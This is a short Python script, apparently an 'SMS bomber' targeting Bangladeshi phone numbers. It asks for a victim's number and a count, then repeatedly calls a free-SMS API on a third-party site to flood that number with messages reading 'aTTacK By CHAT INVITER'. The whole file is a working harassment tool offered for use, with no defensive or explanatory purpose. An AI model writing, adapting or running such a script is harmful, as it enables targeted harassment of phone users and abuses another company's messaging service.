import requests

green = '\033[1;32m'
end = '\033[0m'
print (green+"""  _   _ ____    ____  _   _       _  ___ _ ____  
 | | | |  _ \  / ___|| | | | __ _| |/ (_|_) __ ) 
 | |_| | | | | \___ \| |_| |/ _` | ' /| | |  _ \ 
 |  _  | |_| |  ___) |  _  | (_| | . \| | | |_) |
 |_| |_|____/  |____/|_| |_|\__,_|_|\_\_|_|____/ 
                                                  """+end)
                                                  
number  = str(input("[>] Enter The BD Number: "))
amount = int(input("[>] Enter The Amount: "))

url = "http://crux.bongobd.com/api/SMS/SendFreeSMS?msisdn=88"+number+"&sms=aTTacK%20By%20CHAT%20INVITER%20&sc=16443"

for i in range(amount):

	resp = requests.get(url)

	print(str(i+1)+" SMS Sent")